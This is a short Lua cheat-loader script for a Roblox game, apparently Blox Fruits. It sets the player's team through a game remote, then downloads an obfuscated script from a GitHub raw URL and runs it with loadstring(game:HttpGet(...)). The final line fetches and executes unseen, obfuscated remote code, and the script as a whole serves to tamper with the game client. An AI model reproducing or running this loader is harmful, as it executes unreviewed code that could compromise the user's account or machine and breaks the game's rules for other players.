--getgenv().team = "Marines" -- Change to "Pirates" if preferred
repeat wait() until game:IsLoaded() and game.Players.LocalPlayer:FindFirstChild("DataLoaded")

-- Reliable team selection method
if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Main (minimal)") then
    repeat
        wait()
        local l_Remotes_0 = game.ReplicatedStorage:WaitForChild("Remotes")
        l_Remotes_0.CommF_:InvokeServer("SetTeam", getgenv().team)
        task.wait(1)
    until not game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Main (minimal)")
end
----------------
task.wait(2)
loadstring(game:HttpGet("https://raw.githubusercontent.com/anuragaming1/Meow-hub/refs/heads/main/obfuscated_script-1757953069047.lua.txt"))()
